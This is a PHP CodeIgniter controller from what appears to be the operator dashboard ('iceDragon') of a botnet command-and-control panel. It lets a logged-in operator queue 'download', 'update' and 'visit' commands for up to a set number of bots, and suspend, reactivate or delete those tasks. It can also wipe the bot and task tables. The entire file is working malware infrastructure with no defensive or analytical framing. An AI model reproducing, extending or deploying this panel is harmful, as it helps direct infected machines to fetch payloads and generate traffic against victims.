<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Task extends CI_Controller {
	public function __construct(){
		 parent::__construct();
		 $this->load->helper('url');
	}
	
	public function index(){
		if (!$this->ion_auth->logged_in()) { redirect('auth/login', 'refresh'); }

		$message = '';
		if($this->input->post()){
			$task = $this->input->post('command');
			$parameter = $this->input->post('parameter');
			$limit = $this->input->post('limit');

			$parameter = strip_tags($parameter);
			$limit = strip_tags($limit);

			$task_id = time();
			
			if($task == 'download'){
				$command = 'download ' . $parameter . ' ' . $task_id;
			}
			
			if($task == 'update'){
				$command = 'update ' . $parameter . ' ' . $task_id;
			}
			if($task == 'visit'){
				$command = 'visit ' . $parameter . ' ' . $task_id;
			}
			
			$data = array(
				'cmd_hash' => md5(time()),
				'cmd' => $command,
				'maxbots' => $limit,
				'id' => $task_id
			);
			$this->db->insert('tasks', $data);
			
			$message = '
				<div class="alert bg-success" role="alert">
					<svg class="glyph stroked checkmark"><use xlink:href="#stroked-checkmark"></use></svg> Your task has been added!<a href="#" class="pull-right"><span class="glyphicon glyphicon-remove"></span></a>
				</div>
			';
		}
		
		if($this->input->get('a')){
			
			if($this->input->get('a') == "supspend"){
				$data = array(
					'status' => '2'
				);
				$this->db->where('id', $this->input->get('id'));
				$this->db->update('tasks', $data);
				
				$message = '
					<div class="alert bg-success" role="alert">
						<svg class="glyph stroked checkmark"><use xlink:href="#stroked-checkmark"></use></svg> Your task has been supspended!<a href="#" class="pull-right"><span class="glyphicon glyphicon-remove"></span></a>
					</div>
				';
			}
			if($this->input->get('a') == "reactivate"){
				$data = array(
					'status' => '0'
				);
				$this->db->where('id', $this->input->get('id'));
				$this->db->update('tasks', $data);
				
				$message = '
					<div class="alert bg-success" role="alert">
						<svg class="glyph stroked checkmark"><use xlink:href="#stroked-checkmark"></use></svg> Your task has been Reactivated!<a href="#" class="pull-right"><span class="glyphicon glyphicon-remove"></span></a>
					</div>
				';
			}			
			if($this->input->get('a') == "remove"){
				$this->db->where('id', $this->input->get('id'));
				$this->db->delete('tasks');
				
				$message = '
					<div class="alert bg-success" role="alert">
						<svg class="glyph stroked checkmark"><use xlink:href="#stroked-checkmark"></use></svg> Your task has been removed!<a href="#" class="pull-right"><span class="glyphicon glyphicon-remove"></span></a>
					</div>
				';
			}
			
		}
		
		
		$this->template->set('title', 'iceDragon - Dashboard');
		@$this->template->load('main', 'task', array(
			'message' => $message
		));
	}
	
	public function clearBots(){
		if (!$this->ion_auth->logged_in()) { redirect('auth/login', 'refresh'); }
		
		$this->db->empty_table('bots');
	}
	
	public function clearTasks(){
		if (!$this->ion_auth->logged_in()) { redirect('auth/login', 'refresh'); }
		$this->db->empty_table('tasks');
		$this->db->empty_table('tasks_finished');
	}
} 
